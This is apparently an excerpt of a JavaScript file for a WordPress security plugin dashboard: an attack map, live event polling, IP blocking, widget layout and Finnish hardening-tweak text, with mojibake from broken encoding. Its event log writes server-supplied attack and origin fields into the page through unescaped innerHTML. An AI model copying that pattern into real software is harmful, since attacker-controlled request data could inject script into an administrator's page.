ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
function latLngToSvgPoint(latlng) {
  const pt = map.latLngToContainerPoint(L.latLng(latlng));
  return { x: pt.x, y: pt.y };
}

function drawAttackLines() {
  const svg = document.getElementById('attack-svg');
  // Clear existing paths (not defs)
  Array.from(svg.querySelectorAll('path.attack-line, circle.atk-dot, circle.flight-blip, animateMotion, mpath')).forEach(el => el.remove());

  const hub = latLngToSvgPoint(locations.hub);

  activeMapEvents.forEach((data) => {
    if (!data.lat || !data.lng) return;
    
    const from = latLngToSvgPoint([data.lat, data.lng]);
    const cls = data.statusClass;
    
    const cx = (from.x + hub.x) / 2;
    const cy = (from.y + hub.y) / 2 - Math.abs(hub.x - from.x) * 0.15;

    const pathId = 'path-' + Math.random().toString(36).substr(2, 9);

    const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
    path.setAttribute('d', `M${from.x},${from.y} Q${cx},${cy} ${hub.x},${hub.y}`);
    path.setAttribute('id', pathId);
    path.setAttribute('class', `attack-line ${cls}`);
    path.style.pointerEvents = 'stroke';
    
    const modalData = {
        origin: `${data.country} ï¿½?" ${data.city}`,
        ip: data.ip,
        attack: data.attack,
        host: data.target,
        endpoint: data.type.includes('404') ? '404 Probe' : 'N/A',
        status: data.status,
        statusClass: data.statusClass
    };
    path.addEventListener('click', () => openModal(modalData));
    svg.appendChild(path);

    // Flight radar style blip (airplane dot)
    const plane = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    plane.setAttribute('r', '5');
    plane.setAttribute('fill', cls === 'critical' ? '#dc2626' : (cls === 'info' ? '#3b82f6' : '#f59e0b'));
    plane.setAttribute('class', 'flight-blip');
    plane.style.filter = 'drop-shadow(0 0 6px currentColor)';
    
    const motion = document.createElementNS('http://www.w3.org/2000/svg', 'animateMotion');
    motion.setAttribute('dur', '1.8s');
    motion.setAttribute('repeatCount', 'indefinite');
    
    const mpath = document.createElementNS('http://www.w3.org/2000/svg', 'mpath');
    mpath.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#' + pathId);
    
    motion.appendChild(mpath);
    plane.appendChild(motion);
    svg.appendChild(plane);

    const dot = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    dot.setAttribute('class', 'atk-dot');
    dot.setAttribute('cx', from.x);
    dot.setAttribute('cy', from.y);
    dot.setAttribute('r', 4);
    dot.setAttribute('fill', cls === 'critical' ? '#dc2626' : (cls === 'info' ? '#3b82f6' : '#f59e0b'));
    dot.style.opacity = '0.8';
    svg.appendChild(dot);
  });
}

window.refreshSecurityMap = function () {
  const mapArea = document.getElementById('ps-map-area');
  if (!mapArea || mapArea.style.display === 'none' || mapArea.offsetWidth === 0) return;
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      map.invalidateSize({ animate: false });
      drawAttackLines();
    });
  });
};

map.whenReady(() => {
  window.refreshSecurityMap();
});
// Redraw lines on map move so they track geographic positions
map.on('move', drawAttackLines);
map.on('resize', drawAttackLines);

const mapAreaEl = document.getElementById('ps-map-area');
if (mapAreaEl && typeof ResizeObserver !== 'undefined') {
  let mapResizeTimer;
  new ResizeObserver(() => {
    clearTimeout(mapResizeTimer);
    mapResizeTimer = setTimeout(() => window.refreshSecurityMap(), 80);
  }).observe(mapAreaEl);
}
window.addEventListener('resize', () => window.refreshSecurityMap());

// Hide SVG during zoom animation to prevent visual glitches
map.on('zoomstart', () => {
  document.getElementById('attack-svg').style.opacity = '0';
});
map.on('zoomend', () => {
  drawAttackLines();
  document.getElementById('attack-svg').style.opacity = '1';
});

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   LIVE EVENTS POLLING
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
async function fetchLiveEvents() {
  try {
    const formData = new FormData();
    formData.append('action', 'pmc_security_live_map_data');
    const response = await fetch(ajaxurl, {
      method: 'POST',
      body: formData
    });
    const res = await response.json();
    if (res.success && Array.isArray(res.data)) {
      activeMapEvents = res.data;
      updateEventLogTable(activeMapEvents);
      updateMapMarkers(activeMapEvents);
      drawAttackLines();
    }
  } catch (err) {
    console.error('Live-tapahtumien nouto epÃ¤onnistui:', err);
  }
}

function updateEventLogTable(events) {
  const tbody = document.getElementById('event-log-body');
  if (!tbody) return;
  if (events.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#9ca3af;padding:20px;">Ei tuoreita tapahtumia</td></tr>';
    return;
  }
  let html = '';
  events.forEach(e => {
    const badgeCls = e.statusClass === 'critical' ? 'badge-critical' : 'badge-warning';
    html += `
      <tr>
        <td class="td-time">${e.timestamp}</td>
        <td>${e.country} ï¿½?" ${e.city}</td>
        <td>${e.target}</td>
        <td>${e.attack}</td>
        <td style="text-align:right"><span class="badge-status ${badgeCls}">${e.status}</span></td>
      </tr>
    `;
  });
  tbody.innerHTML = html;
}

// Poll every 15 seconds
setInterval(fetchLiveEvents, 15000);
fetchLiveEvents();

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   SIDEBAR TOGGLE
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
function toggleSidebar() {
  const sb   = document.getElementById('ps-sidebar');
  const icon = document.getElementById('sidebar-icon');
  const expanded = !sb.classList.contains('collapsed');
  sb.classList.toggle('collapsed', expanded);
  icon.textContent = expanded ? 'menu' : 'menu_open';
  setTimeout(() => { if (typeof window.refreshSecurityMap === 'function') window.refreshSecurityMap(); }, 300);
}
window.toggleSidebar = toggleSidebar;

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   THREAT MODAL
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
function openModal(data) {
  document.getElementById('modal-origin').textContent   = data.origin   || 'ï¿½?"';
  document.getElementById('modal-ip').textContent       = data.ip       || 'ï¿½?"';
  document.getElementById('modal-attack').textContent   = data.attack   || 'ï¿½?"';
  document.getElementById('modal-host').textContent     = data.host     || 'ï¿½?"';
  document.getElementById('modal-endpoint').textContent = data.endpoint || 'ï¿½?"';
  document.getElementById('modal-status').textContent   = data.status   || 'ï¿½?"';
  document.getElementById('threat-modal-backdrop').classList.add('open');
  
  const statusEl = document.getElementById('modal-status');
  const statusContainer = document.getElementById('modal-status-container');
  const statusDot = document.getElementById('modal-status-dot');
  const statusLabel = document.getElementById('modal-status-label');
  
  if (data.statusClass === 'info') {
    statusEl.style.color = '#3b82f6';
    if(statusContainer) statusContainer.style.color = '#3b82f6';
    if(statusDot) statusDot.style.background = '#3b82f6';
    if(statusLabel) statusLabel.textContent = 'Normaali Liikenne';
  } else {
    statusEl.style.color = '#dc2626';
    if(statusContainer) statusContainer.style.color = '#dc2626';
    if(statusDot) statusDot.style.background = '#dc2626';
    if(statusLabel) statusLabel.textContent = 'Aktiivinen Murtoyritys';
  }

  const btnBlock = document.getElementById('btn-block-ip');
  if (btnBlock) {
    btnBlock.dataset.ip = data.ip;
  }
}
function closeModal() {
  document.getElementById('threat-modal-backdrop').classList.remove('open');
}
window.openModal  = openModal;
window.closeModal = closeModal;

document.addEventListener('DOMContentLoaded', () => {
  const btnBlock = document.getElementById('btn-block-ip');
  if (btnBlock) {
    btnBlock.addEventListener('click', function() {
      const ip = this.dataset.ip;
      if (!ip) return;
      
      const formData = new URLSearchParams();
      formData.append('action', 'pmc_instant_block');
      formData.append('ip', ip);
      
      fetch(typeof ajaxurl !== 'undefined' ? ajaxurl : '/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: formData
      })
      .then(res => res.json())
      .then(res => {
        if (res.success || res.data) {
          alert('IP Blocked: ' + ip);
          closeModal();
          if (typeof fetchLiveEvents === 'function') fetchLiveEvents();
          else if (typeof refreshSecurityMap === 'function') refreshSecurityMap();
        } else {
          alert('Failed to block IP.');
        }
      })
      .catch(err => {
        console.error(err);
        alert('Error blocking IP.');
      });
    });
  }
});


/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   LOCKDOWN
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
function triggerLockdown() {
  document.getElementById('lockdown-overlay').classList.add('open');
}
function disableLockdown() {
  document.getElementById('lockdown-overlay').classList.remove('open');
}
window.triggerLockdown  = triggerLockdown;
window.disableLockdown  = disableLockdown;

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   DRAG & DROP WIDGETS ï¿½?" smart grid
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
if (typeof Sortable !== 'undefined') {

  // ï¿½"? 9-cell grid ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
  document.querySelectorAll('.grid-cell').forEach(cell => {
    new Sortable(cell, {
      group: 'widgets',
      animation: 220,
      handle: '.drag-handle',
      ghostClass: 'sortable-ghost',
      chosenClass: 'sortable-chosen',
      dragClass: 'sortable-drag',
      forceFallback: true,
      fallbackOnBody: true,
      easing: 'cubic-bezier(0.22, 0.68, 0, 1.2)',
      onStart() {
        document.getElementById('ps-widgets').classList.add('drag-active');
      },
      onEnd(evt) {
        document.getElementById('ps-widgets').classList.remove('drag-active');
        const el = evt.item;
        el.classList.remove('just-dropped');
        void el.offsetWidth; // reflow
        el.classList.add('just-dropped');
        el.addEventListener('animationend', () => el.classList.remove('just-dropped'), { once: true });
        saveWidgetOrder();
      },
    });
  });

  // ï¿½"? persist order ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
  function saveWidgetOrder() {
    const layout = {};
    document.querySelectorAll('.grid-cell').forEach(cell => {
      layout[cell.id] = [...cell.querySelectorAll('.glass-card')].map(el => el.id);
    });
    try { localStorage.setItem('ps-widget-layout', JSON.stringify(layout)); } catch(e) {}
  }

  function restoreWidgetOrder() {
    try {
      const saved = JSON.parse(localStorage.getItem('ps-widget-layout') || 'null');
      if (!saved) return;
      Object.keys(saved).forEach(cellId => {
        const cell = document.getElementById(cellId);
        if (cell) {
          saved[cellId].forEach(widgetId => {
            const w = document.getElementById(widgetId);
            if (w) cell.appendChild(w);
          });
        }
      });
    } catch(e) {}
  }
  restoreWidgetOrder();

  // ï¿½"? Widget Toggles ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
  function initWidgetToggles() {
    const savedHidden = JSON.parse(localStorage.getItem('ps-hidden-widgets') || '[]');
    document.querySelectorAll('.widget-toggle:not(#toggle-all-widgets)').forEach(btn => {
      const targetId = btn.getAttribute('data-target');
      const widget = document.getElementById(targetId);
      
      // Restore initial state
      if (savedHidden.includes(targetId)) {
        btn.classList.remove('active');
        if (widget) widget.classList.add('widget-hidden');
      }

      btn.addEventListener('click', () => {
        const isActive = btn.classList.toggle('active');
        if (widget) {
          widget.classList.toggle('widget-hidden', !isActive);
        }
        
        // Save state
        const currentlyHidden = [];
        document.querySelectorAll('.widget-toggle:not(#toggle-all-widgets):not(.active)').forEach(b => {
          currentlyHidden.push(b.getAttribute('data-target'));
        });
        localStorage.setItem('ps-hidden-widgets', JSON.stringify(currentlyHidden));
      });
    });
  }
  initWidgetToggles();

  // ï¿½"? Toggle All Widgets ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
  function initToggleAll() {
    const btnAll = document.getElementById('toggle-all-widgets');
    const iconAll = document.getElementById('toggle-all-icon');
    if (!btnAll) return;

    function updateMasterIcon() {
      const allToggles = document.querySelectorAll('.widget-toggle:not(#toggle-all-widgets)');
      const allOn = Array.from(allToggles).every(b => b.classList.contains('active'));
      iconAll.textContent = allOn ? 'visibility_off' : 'visibility';
      btnAll.title = allOn ? 'Hide All Widgets' : 'Show All Widgets';
    }

    btnAll.addEventListener('click', () => {
      const allToggles = document.querySelectorAll('.widget-toggle:not(#toggle-all-widgets)');
      const allOn = Array.from(allToggles).every(b => b.classList.contains('active'));
      
      allToggles.forEach(btn => {
        if (allOn && btn.classList.contains('active')) {
          btn.click(); // turn off
        } else if (!allOn && !btn.classList.contains('active')) {
          btn.click(); // turn on
        }
      });
      updateMasterIcon();
    });

    document.querySelectorAll('.widget-toggle:not(#toggle-all-widgets)').forEach(btn => {
      btn.addEventListener('click', updateMasterIcon);
    });
    
    updateMasterIcon();
  }
  initToggleAll();

  // ï¿½"? Maximize Widgets ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
  function initMaximize() {
    const backdrop = document.getElementById('maximize-backdrop');
    let currentlyMaximized = null;
    let placeholder = null;

    function unmaximize() {
      if (currentlyMaximized) {
        currentlyMaximized.classList.remove('maximized');
        const icon = currentlyMaximized.querySelector('.widget-maximize .material-symbols-outlined');
        if (icon) icon.textContent = 'open_in_full';
        
        if (placeholder) {
          placeholder.remove();
          placeholder = null;
        }
        
        currentlyMaximized = null;
        if (backdrop) backdrop.classList.remove('active');
      }
    }

    document.querySelectorAll('.widget-maximize').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const card = btn.closest('.glass-card');
        const icon = btn.querySelector('.material-symbols-outlined');
        
        if (card.classList.contains('maximized')) {
          unmaximize();
        } else {
          unmaximize(); // Close any other
          
          // Create placeholder to prevent grid shift
          placeholder = document.createElement('div');
          placeholder.style.width = card.offsetWidth + 'px';
          placeholder.style.height = card.offsetHeight + 'px';
          placeholder.style.transition = 'none';
          card.parentNode.insertBefore(placeholder, card);
          
          card.classList.add('maximized');
          if (icon) icon.textContent = 'close_fullscreen';
          currentlyMaximized = card;
          if (backdrop) backdrop.classList.add('active');
          if (card.id === 'w-login-security') {
            pmcSec.fetchLoginSubModalData();
          }
        }
      });
    });

    if (backdrop) backdrop.addEventListener('click', unmaximize);
  }
  initMaximize();

}

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   LIVE EVENT FEED
   Now handled by fetchLiveEvents()
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   PECODEX SECURITY AJAX INTEGRATION
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
const TWEAK_DEFS = {
	xml_rpc: { title: "Poista XML-RPC kÃ¤ytÃ¶stÃ¤", desc: "EstÃ¤ XML-RPC brute force -hyÃ¶kkÃ¤ykset.", overview: "XML-RPC on usein brute force - ja DDoS-hyÃ¶kkÃ¤ysten kohteena. Jos et kÃ¤ytÃ¤ WordPress-mobiilisovellusta tai palveluja kuten Jetpack, on turvallisempaa poistaa se kÃ¤ytÃ¶stÃ¤.", fix: "Poistamme XML-RPC:n kÃ¤ytÃ¶stÃ¤ suojataksemme sivustoasi nÃ¤iltÃ¤ automatisoiduilta hyÃ¶kkÃ¤yksiltÃ¤." },
	file_editor: { title: "Poista Tiedostoeditori kÃ¤ytÃ¶stÃ¤", desc: "Poista kÃ¤ytÃ¶stÃ¤ sisÃ¤Ã¤nrakennettu teema-/lisÃ¤osaeditori.", overview: "WordPressissÃ¤ on sisÃ¤Ã¤nrakennettu tiedostoeditori. Jos hyÃ¶kkÃ¤Ã¤jÃ¤ saa yllÃ¤pito-oikeudet, he voivat kÃ¤yttÃ¤Ã¤ tÃ¤tÃ¤ haitallisen koodin syÃ¶ttÃ¤miseen. Sen poistaminen lisÃ¤Ã¤ kriittisen puolustuskerroksen.", fix: "MÃ¤Ã¤ritÃ¤mme DISALLOW_FILE_EDIT wp-config.php -tiedostoosi estÃ¤Ã¤ksemme pÃ¤Ã¤syn." },
	wp_version: { title: "Piilota WP-versio", desc: "Poista WordPressin versio HTML-tulosteesta.", overview: "WordPress tulostaa automaattisesti versionumeronsa sivuston lÃ¤hdekoodiin. Hakkerit skannaavat tÃ¤tÃ¤ kohdistaakseen hyÃ¶kkÃ¤yksiÃ¤ sivustoihin, joissa on vanhentuneita, haavoittuvia versioita.", fix: "Piilotamme WordPressin version julkisesta HTML-tulosteestasi." },
	prevent_enum: { title: "EstÃ¤ KÃ¤yttÃ¤jien Luetteleminen", desc: "EstÃ¤ botteja lÃ¶ytÃ¤mÃ¤stÃ¤ kÃ¤yttÃ¤jÃ¤tunnuksia.", overview: "Oletuksena hyÃ¶kkÃ¤Ã¤jÃ¤t voivat helposti lÃ¶ytÃ¤Ã¤ sivustosi kÃ¤yttÃ¤jÃ¤tunnukset skannaamalla kirjoittaja-arkistoja. TÃ¤mÃ¤ tekee brute-force -hyÃ¶kkÃ¤yksistÃ¤ paljon helpompia.", fix: "EstÃ¤mme skriptit, jotka yrittÃ¤vÃ¤t automaattisesti luetella kÃ¤yttÃ¤jiÃ¤si." },
	hide_errors: { title: "Piilota PHP-virheet", desc: "EstÃ¤ virheiden nÃ¤kyminen julkisivulla.", overview: "PHP-virheet voivat paljastaa hyÃ¶kkÃ¤Ã¤jille arkaluonteisia palvelinpolkuja, muuttujia ja tietokantarakenteita.", fix: "Varmistamme, ettÃ¤ WP_DEBUG_DISPLAY on poistettu kÃ¤ytÃ¶stÃ¤, jotta virheet pysyvÃ¤t piilossa vierailijoilta." },
	change_admin: { title: "Vaihda 'admin'-kÃ¤yttÃ¤jÃ¤tunnus", desc: "Varmista, ettei kenellÃ¤kÃ¤Ã¤n kÃ¤yttÃ¤jÃ¤llÃ¤ ole oletus 'admin'-tunnusta.", overview: "KÃ¤yttÃ¤jÃ¤tunnus 'admin' on ensimmÃ¤inen asia, jota hakkerit yrittÃ¤vÃ¤t yrittÃ¤essÃ¤Ã¤n brute force -hyÃ¶kkÃ¤ystÃ¤ sivustollesi.", fix: "Luo uusi jÃ¤rjestelmÃ¤nvalvojan tili eri kÃ¤yttÃ¤jÃ¤tunnuksella, ja poista sitten vanha 'admin'-tili.", toggleable: false, action_text: "Toimenpide vaaditaan WP-KÃ¤yttÃ¤jissÃ¤" },
	login_duration: { title: "Kirjautumisen Kesto", desc: "VÃ¤hennÃ¤ sitÃ¤ aikaa, jonka kÃ¤yttÃ¤jÃ¤t pysyvÃ¤t kirjautuneina.", overview: "Oletuksena kÃ¤yttÃ¤jÃ¤t, jotka valitsevat 'muista minut', pysyvÃ¤t kirjautuneina 14 pÃ¤ivÃ¤Ã¤. TÃ¤mÃ¤n vÃ¤hentÃ¤minen rajoittaa ikkunaa, jolloin hyÃ¶kkÃ¤Ã¤jÃ¤ voi hyÃ¶dyntÃ¤Ã¤ hylÃ¤ttyÃ¤ istuntoa.", fix: "VÃ¤hennÃ¤mme oletuskirjautumisen kestoa." },
	disable_trackback: { title: "Poista Paluuviitteet kÃ¤ytÃ¶stÃ¤", desc: "EstÃ¤ trackback- ja pingback-roskaposti.", overview: "PaluuviitteitÃ¤ ja takaisinkutsuja kÃ¤ytetÃ¤Ã¤n paljolti roskapostiin ja niitÃ¤ voidaan hyÃ¶dyntÃ¤Ã¤ DDoS-hyÃ¶kkÃ¤yksissÃ¤.", fix: "Poistamme paluuviitteet ja takaisinkutsut kÃ¤ytÃ¶stÃ¤ koko sivustoltasi." },
	protect_info: { title: "Suojaa Tiedot", desc: "EstÃ¤ pÃ¤Ã¤sy ydintiedostoihin kuten readme.html.", overview: "Tiedostot kuten readme.html tai varmuuskopiotiedostot voivat paljastaa arkaluonteisia tietoja ympÃ¤ristÃ¶stÃ¤si.", fix: "Lukitsemme nÃ¤mÃ¤ tiedostot varmistaaksemme, etteivÃ¤t hakkerit pÃ¤Ã¤se niihin kÃ¤siksi." },
	php_version: { title: "PÃ¤ivitÃ¤ PHP", desc: "Varmista, ettÃ¤ kÃ¤ytÃ¤t tuettua PHP-versiota.", overview: "Vanhentuneiden PHP-versioiden suorittaminen altistaa palvelimesi korjaamattomille haavoittuvuuksille.", fix: "PÃ¤ivitÃ¤ PHP-versiosi uusimpaan vakaaseen julkaisuun hosting-paneelisi kautta.", toggleable: false, action_text: "PÃ¤ivitÃ¤ Hosting-paneelista" },
	prevent_php: { title: "EstÃ¤ PHP:n Suoritus", desc: "EstÃ¤ PHP:n suoritus lataushakemistossa.", overview: "Latauskansion pitÃ¤isi sisÃ¤ltÃ¤Ã¤ vain mediaa. Jos hakkeri lataa tÃ¤nne haitallisen PHP-skriptin, tÃ¤mÃ¤ estÃ¤Ã¤ sen suorittamisen.", fix: "Asetamme suojauksia lataushakemistoon estÃ¤Ã¤ksemme PHP:n suorittamisen." },
	security_keys: { title: "Tietoturva-avaimet", desc: "Varmista, ettÃ¤ tietoturva-avaimet on asetettu wp-config.php -tiedostossa.", overview: "Tietoturva-avaimet parantavat kÃ¤yttÃ¤jÃ¤n evÃ¤steisiin tallennettujen tietojen salausta.", fix: "Varmistamme, ettÃ¤ uudet tietoturva-avaimet luodaan ja otetaan kÃ¤yttÃ¶Ã¶n.", toggleable: false, action_text: "Luo Avaimet Uudelleen" },
